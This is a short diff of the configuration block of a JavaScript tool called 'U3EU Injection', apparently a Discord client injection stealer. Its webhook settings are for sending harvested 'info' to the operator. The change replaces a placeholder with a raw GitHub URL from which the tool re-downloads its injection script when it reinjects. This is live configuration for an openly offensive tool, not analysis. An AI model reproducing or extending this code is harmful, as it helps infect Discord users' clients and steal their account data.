@@ -14,7 +14,7 @@ const config = {
   embed_name: 'U3EU Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1071242821782216797/1076251377052958730/Anonymous-Mask-PNG-Image.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 0000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'sss', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/U3EU/U3EU-injection/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
